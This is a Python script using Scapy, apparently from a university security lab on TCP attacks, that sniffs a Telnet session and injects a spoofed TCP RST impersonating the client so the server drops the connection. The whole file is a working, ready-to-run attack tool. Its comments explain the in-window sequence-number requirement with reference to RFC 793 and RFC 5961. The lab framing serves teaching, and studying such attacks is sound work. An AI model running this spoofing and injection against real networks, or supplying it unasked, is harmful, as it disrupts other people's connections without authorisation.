#!/usr/bin/env python3
"""
Lab 6 — TCP Attacks
Task: Automated TCP RST injection to terminate a Telnet session
Description:
    Sniffs the Telnet traffic between a client and server, then injects a
    spoofed TCP RST (reset) segment that causes the server to immediately
    close the connection.  The client's Telnet session is terminated without
    the client or server sending a FIN.

    Usage:
        sudo python3 reset_auto.py <client_ip> <server_ip>
    Example:
        sudo python3 reset_auto.py 10.9.0.6 10.9.0.5

    The RST must have a sequence number within the receiver's window.
    We read the current SEQ from a live sniffed packet to guarantee this.
"""

import sys
from scapy.all import IP, TCP, sniff, send, Packet

# =============================================================================
# Parse command-line arguments
# =============================================================================

if len(sys.argv) != 3:
    print(f"Usage: {sys.argv[0]} <client_ip> <server_ip>")
    sys.exit(1)

CLIENT_IP = sys.argv[1]   # e.g. 10.9.0.6 (the Telnet client)
SERVER_IP = sys.argv[2]   # e.g. 10.9.0.5 (the Telnet server, port 23)

# =============================================================================
# BPF filter — capture only the Telnet data packets FROM the client TO server
# =============================================================================
# We sniff client->server packets because their SEQ field is the value the
# SERVER expects next — a RST with that SEQ will be accepted by the server.

myFilter = (
    f"tcp and src host {CLIENT_IP} and dst host {SERVER_IP} "
    f"and dst port 23"
)

# =============================================================================
# Why the sequence number matters
# =============================================================================
# A TCP RST is only accepted by the receiver if its sequence number falls
# within the current receive window:
#
#   RCV.NXT  <=  SEG.SEQ  <  RCV.NXT + RCV.WND
#
# (RFC 793 §3.4).  If the RST carries an out-of-window sequence number the
# receiver silently discards it (blind RST protection, RFC 5961).
#
# By reading SEG.SEQ from a freshly sniffed data packet we guarantee that
# our RST carries an in-window sequence number and will be accepted.

# =============================================================================
# Packet callback: send RST and stop sniffing
# =============================================================================

rst_sent = False   # Guard — send only one RST per invocation

def spoof_rst(pkt: Packet) -> None:
    global rst_sent

    if rst_sent:
        return   # Already injected a RST; ignore further packets

    if not pkt.haslayer(TCP):
        return

    # Read the current sequence number from the sniffed segment.
    # This is what the SERVER will use as the next expected byte, so a RST
    # with this SEQ will fall exactly at RCV.NXT — always in-window.
    current_seq = pkt[TCP].seq

    # Construct the forged RST packet:
    #   src  = client IP   (impersonate the client)
    #   dst  = server IP
    #   sport = the actual client's source port (from the sniffed packet)
    #   dport = 23 (Telnet)
    #   flags = 'R' (RST)
    #   seq   = sniffed sequence number

    ip  = IP(src=CLIENT_IP, dst=SERVER_IP)
    tcp = TCP(
        sport=pkt[TCP].sport,   # Must match the established connection's sport
        dport=23,
        flags="R",              # RST flag — signals abrupt connection termination
        seq=current_seq,        # In-window sequence number (see explanation above)
    )

    rst_pkt = ip / tcp
    send(rst_pkt, verbose=False)

    rst_sent = True   # Prevent further injections

    print(f"[+] RST injected:")
    print(f"    Spoofed src : {CLIENT_IP}:{pkt[TCP].sport}")
    print(f"    Destination : {SERVER_IP}:23")
    print(f"    Flags       : {rst_pkt[TCP].flags!r}")
    print(f"    SEQ         : {current_seq} (0x{current_seq:08x})")
    print(f"[+] Telnet session should be terminated.")

    return True   # Returning a truthy value stops sniff() (stop_filter)

# =============================================================================
# Start sniffing and inject RST on the first matching packet
# =============================================================================

print(f"[*] Waiting for Telnet packet from {CLIENT_IP} to {SERVER_IP}:23 ...")
print(f"[*] BPF filter: {myFilter!r}\n")

sniff(
    filter=myFilter,
    prn=spoof_rst,
    stop_filter=lambda p: rst_sent,   # Stop after the RST is sent
)
